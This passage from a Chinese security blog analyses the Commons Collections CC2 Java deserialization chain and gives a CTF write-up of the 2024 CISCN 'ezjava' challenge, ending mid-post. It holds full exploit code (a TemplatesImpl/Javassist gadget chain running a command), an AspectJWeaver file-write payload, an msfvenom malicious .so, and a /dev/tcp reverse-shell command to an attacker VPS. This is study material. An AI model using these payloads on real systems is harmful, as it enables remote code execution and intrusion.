<span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">                &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chainedTransformer);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">2</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(queue, transformingComparator);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc2.ser&quot;</span>));</span><br><span class="line">            objectOutputStream.writeObject(queue);</span><br><span class="line">            objectOutputStream.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc2.ser&quot;</span>));</span><br><span class="line">            objectInputStream.readObject();</span><br><span class="line">            objectInputStream.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="利用链2"><a href="#利用链2" class="headerlink" title="利用链2"></a>利用链2</h2><p>接下来就是第二条利用链，需要用到Javassist来动态创建类，这条链比第一条要难上一些，我们逐步分析</p><h3 id="什么是Javassist"><a href="#什么是Javassist" class="headerlink" title="什么是Javassist"></a>什么是Javassist</h3><p>Javassist是一个开源的Java字节码操作库，主要用于在Java程序中动态创建和修改类。它的特点是使用简单，开发者不需要深入了解虚拟机指令，能够像写Java代码一样直接插入代码片段来动态生成新类或改变已有类的结构。换句话说，Javassist确实是一个可以动态创建类的工具库，它允许在运行时生成类的字节码并加载到JVM中，支持添加字段、方法、构造函数等操作，实现动态字节码修改和类的动态定义</p><p>举个例子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"><span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.get(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line"><span class="type">CtMethod</span> <span class="variable">m</span> <span class="operator">=</span> cc.getDeclaredMethod(<span class="string">&quot;say&quot;</span>);</span><br><span class="line">m.insertBefore(<span class="string">&quot;&#123; System.out.println(\&quot;Hello.say():\&quot;); &#125;&quot;</span>);</span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> cc.toClass();</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> clazz.newInstance();</span><br></pre></td></tr></table></figure><p>这里，Hello类的say方法被插入打印语句，随后调用<code>toClass()</code>，把修改后的类加载成Java类，并创建其实例</p><p>需要知道的是，用<code>makeClassInitializer()</code>插入代码，最终生成的类就有<code>static</code>块，存在静态初始化方法的类，在该类首次被加载并初始化时执行一次，如反射、创建实例、访问静态成员等，该方法都会被自动调用。先记住，我们后面会用到</p><h3 id="过程分析"><a href="#过程分析" class="headerlink" title="过程分析"></a>过程分析</h3><p>这条链的核心是<code>TemplatesImpl</code>类的<code>newTransformer()</code>方法</p><p>我们看到有个<code>getTransletInstance()</code>方法，跟进去看看</p><p><img src="https://oss.waynejoons.icu/picphoto/20251108134254567.png"></p><p>当<code>_name</code>不为null且<code>_class</code>等于null时，会执行函数<code>defineTransletClasses()</code>，继续跟进去看看</p><p><img src="https://oss.waynejoons.icu/picphoto/20251108134629502.png"></p><p>要求<code>_bytecodes</code>不为null，然后通过<code>loader.defineClass()</code>将字节数组还原成Class对象，接着尝试获取父类，检测是否为<code>ABSTRACT_TRANSLET</code>，通过则<code>_transletIndex = i</code></p><p><img src="https://oss.waynejoons.icu/picphoto/20251108135121023.png"></p><p>最后回到<code>getTransletInstance()</code>方法继续执行，将我们动态创建的类实例化，并执行写入的<code>static</code>代码</p><p><img src="https://oss.waynejoons.icu/picphoto/20251109172616702.png"></p><h3 id="代码构造"><a href="#代码构造" class="headerlink" title="代码构造"></a>代码构造</h3><p>我们回到一开始，反序列化的入口为<code>PriorityQueue.readObject()</code>，刚开始的构造步骤跟链1一样，就不细讲了，这里放个我自己简单做的图，可以快速回忆一下</p><p><img src="https://oss.waynejoons.icu/picphoto/20251108140814117.png"></p><p>不同的是<code>InvokerTransformer</code>类这里，我们不是直接调用<code>Runtime</code>执行命令，而是要在这里调用<code>TemplatesImpl</code>的<code>newTransformer()</code>方法，因此需要传入<code>iMethodName</code>，我们看看<code>InvokerTransformer</code>的构造器</p><p><img src="https://oss.waynejoons.icu/picphoto/20251109174046746.png"></p><p>是<code>private</code>方法，接下来就是通过反射来实现，构建代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Constructor</span> <span class="variable">invokerTransformerConstructor</span> <span class="operator">=</span> InvokerTransformer.class.getDeclaredConstructor(String.class);</span><br><span class="line">invokerTransformerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> (InvokerTransformer) invokerTransformerConstructor.newInstance(<span class="string">&quot;newTransformer&quot;</span>);</span><br></pre></td></tr></table></figure><p>然后把链1传给<code>TransformingComparator</code>的参数改一下，传入我们写的<code>transformer</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer);</span><br><span class="line"><span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>为了后面能方便地通过反射修改私有字段，我们写一个函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">    field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    field.set(obj, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来就要用到Javassist了，构造代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取javassist类池，插入AbstractTranslet类所在的路径，然后创建新的空类Evil</span></span><br><span class="line"><span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line"><span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line"><span class="comment">// 在静态初始化块中插入恶意命令代码，需要用到 makeClassInitializer()</span></span><br><span class="line"><span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>;</span><br><span class="line">cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line"><span class="comment">// 继承AbstractTranslet类</span></span><br><span class="line">cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line"><span class="comment">// 避免文件名重复</span></span><br><span class="line"><span class="type">String</span> <span class="variable">rename</span> <span class="operator">=</span> <span class="string">&quot;Evil&quot;</span> + System.nanoTime();</span><br><span class="line">cc.setName(rename);</span><br><span class="line">cc.writeFile();</span><br><span class="line"><span class="comment">// 将动态类转为字节码byte数组</span></span><br><span class="line"><span class="type">byte</span>[] bytes = cc.toBytecode();</span><br><span class="line"><span class="type">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;;</span><br></pre></td></tr></table></figure><p>实例化之后效果如下</p><p><img src="https://oss.waynejoons.icu/picphoto/20251109175800340.png"></p><p>接着根据我们前面的分析过程，尝试实例化<code>TemplatesImpl()</code>并修改相关字段，<code>_bytecodes</code>为前面Javassist那里写的<code>targetByteCodes</code>恶意字节码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;test&quot;</span>);<span class="comment">// 随便传个值，不为null就可以</span></span><br><span class="line">setFieldValue(templates, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, targetByteCodes);</span><br></pre></td></tr></table></figure><p>然后对于<code>TransformingComparator.compare()</code>的<code>obj1</code>，我们传入实例化的<code>TemplatesImpl</code>，也就是<code>templates</code>，<code>obj2</code>就随便传个1。同样的，我们也是通过反射来设置，绕过<code>add()</code>方法，直接构建反序列化所需的状态</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Object[] array = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates, <span class="number">1</span>&#125;;</span><br><span class="line">setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, array);</span><br><span class="line">setFieldValue(queue, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">setFieldValue(queue, <span class="string">&quot;comparator&quot;</span>, transformingComparator);</span><br></pre></td></tr></table></figure><p>最后，我们画个图来直观感受一下</p><p><img src="https://oss.waynejoons.icu/picphoto/20251109235713096.png"></p><h3 id="最终利用-1"><a href="#最终利用-1" class="headerlink" title="最终利用"></a>最终利用</h3><p>把前面的代码整理合并一起，得到完整exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="type">String</span> <span class="variable">rename</span> <span class="operator">=</span> <span class="string">&quot;Evil&quot;</span> + System.nanoTime();</span><br><span class="line">        cc.setName(rename);</span><br><span class="line">        cc.writeFile();</span><br><span class="line">        <span class="type">byte</span>[] bytes = cc.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">invokerTransformerConstructor</span> <span class="operator">=</span> InvokerTransformer.class.getDeclaredConstructor(String.class);</span><br><span class="line">        invokerTransformerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> (InvokerTransformer) invokerTransformerConstructor.newInstance(<span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, targetByteCodes);</span><br><span class="line"></span><br><span class="line">        Object[] array = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates, <span class="number">1</span>&#125;;</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, array);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;comparator&quot;</span>, transformingComparator);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc2.ser&quot;</span>));</span><br><span class="line">            objectOutputStream.writeObject(queue);</span><br><span class="line">            objectOutputStream.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc2.ser&quot;</span>));</span><br><span class="line">            objectInputStream.readObject();</span><br><span class="line">            objectInputStream.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>验证一下，成功执行</p><p><img src="https://oss.waynejoons.icu/picphoto/20251109235916930.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这次的审计相比CC1更快了，多阅读代码对自己帮助挺大的，同时一通审计下来发现思路真的很妙，很惊叹CC链作者的脑洞，还得继续努力，加油</p>]]></content>
    
    
    <summary type="html">Java反序列化安全 CC2链复现与分析</summary>
    
    
    
    <category term="Java安全" scheme="https://waynejoon.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Java安全" scheme="https://waynejoon.github.io/tags/Java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>2024CISCN ezjava复现</title>
    <link href="https://waynejoon.github.io/posts/2024CISCN_ezjava/"/>
    <id>https://waynejoon.github.io/posts/2024CISCN_ezjava/</id>
    <published>2025-11-04T08:23:46.000Z</published>
    <updated>2025-11-10T04:10:24.168Z</updated>
    
    <content type="html"><![CDATA[<h2 id="起点"><a href="#起点" class="headerlink" title="起点"></a>起点</h2><p>首先打开题目，可以看到一个JDBC连接页面</p><p><img src="https://oss.waynejoons.icu/picphoto/20251104095853759.png"></p><p>猜测题目是跟JDBC ATTACK有关，把题目给的附件<code>app.jar</code>扔到jadx逆向还原，导出源码</p><p><img src="https://oss.waynejoons.icu/picphoto/20251104100422854.png"></p><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>用IDEA打开导出的源码，进入<code>com/example/jdbctest</code>目录分析</p><p><img src="https://oss.waynejoons.icu/picphoto/20251104101139426.png"></p><p>分析发现<code>controller/JdbcController.java</code>定义了请求路由</p><p><img src="https://oss.waynejoons.icu/picphoto/20251104101433633.png"></p><p>关注<code>services/DatasourceServiceImpl.java</code>，发现其定义了数据库连接的类型，其中url可控且存在利用点，类型1对应Mysql，类型3对应Sqlite</p><p><img src="https://oss.waynejoons.icu/picphoto/20251104102101312.png"></p><p>那我们可以尝试打MySQL JDBC反序列化写文件和SQLite SSRF读文件，但是具体怎么打呢</p><p>继续分析，在<code>META-INF/maven/com.example/jdbcTest/pom.xml</code>发现<code>aspectjweaver</code></p><p><img src="https://oss.waynejoons.icu/picphoto/20251104104326087.png"></p><p>同时关注到<code>bean/UserBean.java</code>有个<code>readObject</code>可以执行反序列化，且里面参数可控</p><p><img src="https://oss.waynejoons.icu/picphoto/20251104104545366.png"></p><p>可以打<code>aspectjweaver</code>反序列化，那思路就很清晰了，我们通过<code>aspectjweaver</code>反序列化写恶意so文件，然后用mysql jdbc反序列化开虚假mysql服务写入恶意文件，最后用sqlite ssrf加载so文件即可</p><h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><h3 id="AspectJWeaver反序列化"><a href="#AspectJWeaver反序列化" class="headerlink" title="AspectJWeaver反序列化"></a>AspectJWeaver反序列化</h3><p><code>aspectjweaver</code>中有一个<code>SimpleCache</code>类，<code>SimpleCache</code>类中的内部类<code>StoreableCachingMap</code>是一个继承<code>HashMap</code>的类，其重写了<code>HashMap</code>的<code>put</code>方法，<code>put</code>方法中的<code>writeToPath</code>方法执行了写入文件的操作</p><p>具体可以参考文章：<a href="https://xz.aliyun.com/news/10945">AspectJWeaver反序列化利用链</a></p><p>然后我们重新看看<code>UserBean.java</code>，里面的<code>name</code>、<code>age</code>都可控，<code>obj</code>可控因此a也可控，且内容<code>age</code>会进行base64解码后再写入</p><p><img src="https://oss.waynejoons.icu/picphoto/20251104104545366.png"></p><p>可以通过反射来获取属性，用<code>setAccessible</code>绕过访问限制，再修改其对应的值，可以参考上面文章的简单demo部分来写</p><p><img src="https://oss.waynejoons.icu/picphoto/20251104110523497.png"></p><p>具体payload如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">con</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap&quot;</span>).getDeclaredConstructor(String.class,<span class="type">int</span>.class);</span><br><span class="line">        con.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> (HashMap)con.newInstance(<span class="string">&quot;/tmp/&quot;</span>, <span class="number">1</span>); <span class="comment">//存放路径，必须要存在的</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.example.jdbctest.bean.UserBean&quot;</span>).getDeclaredConstructor();</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">userBean</span> <span class="operator">=</span> constructor.newInstance();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> userBean.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> cls.getDeclaredField(<span class="string">&quot;obj&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(userBean, map);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field1</span> <span class="operator">=</span> cls.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        field1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field1.set(userBean, <span class="string">&quot;evil.so&quot;</span>); <span class="comment">//文件名</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field2</span> <span class="operator">=</span> cls.getDeclaredField(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">        field2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>; <span class="comment">//文件内容</span></span><br><span class="line">        field2.set(userBean, payload);</span><br><span class="line">        <span class="type">byte</span>[] bytes = serialize(userBean);</span><br><span class="line">        System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(Base64.getEncoder().encode(bytes)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(<span class="keyword">final</span> Object obj) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">btout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(btout);</span><br><span class="line">        objOut.writeObject(obj);</span><br><span class="line">        <span class="keyword">return</span> btout.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>文件内容我们就写恶意so文件导出的base64编码</p><p>先将要执行的命令进行base64编码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -c <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/你的vps地址/8888 0&gt;&amp;1&quot;</span></span><br><span class="line"></span><br><span class="line">得到 YmFzaCAtYyAiYmFzaCAtaSA+Jxxxxxxx</span><br></pre></td></tr></table></figure><p>用msfvenom创建恶意so文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/exec CMD=<span class="string">&#x27;echo 编码后的内容|base64 -d|bash&#x27;</span> -f elf-so -o evil.so</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20251104112031547.png"></p><p>接着执行<code>cat evil.so | base64 -w0</code>获取so文件编码后的内容，<code>base64 -w0</code>表示不换行</p><p><img src="https://oss.waynejoons.icu/picphoto/20251104112131693.png"></p><p>复制这段内容到payload里面，执行获取编码后的序列化数据</p><p><img src="https://oss.waynejoons.icu/picphoto/20251104112446399.png"></p><h3 id="MySQL-JDBC反序列化"><a href="#MySQL-JDBC反序列化" class="headerlink" title="MySQL JDBC反序列化"></a>MySQL JDBC反序列化</h3><p>接下来就是打mysql jdbc反序列化写文件，制作虚假mysql服务</p><p>原理可以参考：<a 